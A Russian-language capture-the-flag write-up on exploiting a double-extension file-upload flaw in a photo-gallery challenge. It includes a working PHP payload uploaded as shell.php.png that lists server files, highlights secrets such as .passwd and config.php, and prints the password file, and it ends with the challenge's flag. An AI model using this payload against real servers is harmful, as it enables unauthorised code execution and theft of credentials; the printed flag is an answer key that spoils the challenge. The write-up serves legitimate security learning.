# File upload - Double extensions  
## –ì–∞–ª–µ—Ä–µ—è v0.02 
–í–∞—à–∞ —Ü–µ–ª—å - –≤–∑–ª–æ–º–∞—Ç—å —ç—Ç—É —Ñ–æ—Ç–æ–≥–∞–ª–µ—Ä–µ—é, –∑–∞–≥—Ä—É–∑–∏–≤ PHP-–∫–æ–¥.  
–ü–æ–ª—É—á–∏—Ç–µ –ø–∞—Ä–æ–ª—å –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ —Ñ–∞–π–ª–µ .passwd –≤ –∫–æ—Ä–Ω–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.  

–ú—ã –ø–æ–ø–∞–¥–∞–µ–º –Ω–∞ —Å–∞–π—Ç, –≤ –∫–æ—Ç–æ—Ä–æ–º –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑–¥–µ–ª–æ–≤. –í –≥–ª–∞–∑–∞ –±—Ä–æ—Å–∞–µ—Ç—Å—è —Ä–∞–∑–¥–µ–ª "Upload"  
<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/0b2ec078-5ddc-4868-90e4-b6aef7017dc0" />  
–ü–æ–ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ç—É–¥–∞ –æ–±—ã—á–Ω—É—é –∫–∞—Ä—Ç–∏–Ω–∫—É  
<img width="1919" height="1000" alt="image" src="https://github.com/user-attachments/assets/b59e1ff3-a395-4acd-a4ed-c5e4f3e0948b" />  
–ù–∞–º –¥–∞—é—Ç —Å—Å—ã–ª–∫—É, –≥–¥–µ —Ö—Ä–∞–Ω–∏—Ç—Å—è –Ω–∞—à–∞ –∫–∞—Ä—Ç–∏–Ω–∫–∞. –ü–æ–ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ç—É–¥–∞ php —Å–∫—Ä–∏–ø—Ç, –Ω–æ –ø–æ–ª—É—á–∞–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ **Wrong file extension !**. –°–µ—Ä–≤–µ—Ä –ø–∏—à–µ—Ç: **NB : only .gif, .jpeg and .png are accepted**  
–ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Ñ–∞–π–ª shell.php.png —Å –¥–≤–æ–π–Ω—ã–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º  
shell.php.png  
```php
<?php
phpinfo();
?>
```
–æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–æ–ª—É—á–∞–µ–º:  
<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/f86da319-2fa6-452c-9faa-6734df7a9ecc" />  
–°–µ—Ä–≤–µ—Ä –æ–±—Ä–∞–±–æ—Ç–∞–ª –Ω–∞—à –∑–∞–ø—Ä–æ—Å –∏ –≤—ã–≤–µ–ª –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é php  
–°–µ—Ä–≤–µ—Ä —á–∏—Ç–∞–µ—Ç —Ñ–∞–π–ª shell.php.png –∫–∞–∫ PHP-–∫–æ–¥ –±–ª–∞–≥–æ–¥–∞—Ä—è –∫–ª–∞—Å—Å–∏—á–µ—Å–∫–æ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏, —Å–≤—è–∑–∞–Ω–Ω–æ–π —Å –¥–≤–æ–π–Ω—ã–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º (Double Extension), –∫–æ—Ç–æ—Ä–∞—è –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –∏–∑-–∑–∞ —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, —á–∞—â–µ –≤—Å–µ–≥–æ Apache.
–ù–∞–ø–∏—Å–∞–ª —Å–∫—Ä–∏–ø—Ç, —á—Ç–æ–±—ã –≤—ã—Ç–∞—â–∏—Ç—å .passwd –∏–∑ –∫–æ—Ä–Ω–µ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏  
**shell.php.png**
```php
<?php
echo "<pre>";
// –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (–æ–¥–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–∞–∑–∞–¥)
$dir = '../../..'; 
$target_filename = '.passwd';
$target_filepath = "$dir/$target_filename";

// –°–∫–∞–Ω–∏—Ä—É–µ–º —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
$files = @scandir($dir);

if ($files === false) {
    die("–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é '$dir'. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞.");
}

echo "
======================================
      –°–ü–ò–°–û–ö –§–ê–ô–õ–û–í –ò –ü–ê–ü–û–ö –í '$dir'
======================================\n";

// –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –º–∞—Å—Å–∏–≤
foreach ($files as $item) {
    // –ò—Å–∫–ª—é—á–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Å—Å—ã–ª–∫–∏ ('.' –∏ '..')
    if ($item != '.' && $item != '..') {
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–∏–ø–∞ —ç–ª–µ–º–µ–Ω—Ç–∞
        $path = "$dir/$item";
        
        if (is_dir($path)) {
            echo "[DIR]  $item\n";
        } else {
            // –í—ã–¥–µ–ª—è–µ–º –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –≤–∞–∂–Ω—ã–µ —Ñ–∞–π–ª—ã
            if (preg_match('/(\.flag|\.key|\.secret|\.conf|\.passwd|config\.php|\.htaccess)/i', $item)) {
                echo "[FILE] !!!! $item\n";
            } else {
                echo "[FILE] $item\n";
            }
        }
    }
}

$file_content = @file_get_contents($target_filepath);
if ($file_content === false) {
    die("–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ '$target_filepath'. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞.");
}

// –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞
echo "
======================================
  üìú –°–û–î–ï–†–ñ–ò–ú–û–ï –§–ê–ô–õ–ê '$target_filepath'
======================================\n";
echo htmlspecialchars($file_content);

echo "</pre>";
?>
```
–ü–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —ç—Ç–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ø–æ–ª—É—á–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–ª–∞–≥–∞ –∏ –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥!  
<img width="1918" height="983" alt="image" src="https://github.com/user-attachments/assets/9e9ca1b9-a558-4b5e-b349-3f2d14718be5" />  
**–§–ª–∞–≥: Gg9LRz-hWSxqqUKd77-_q-6G8**
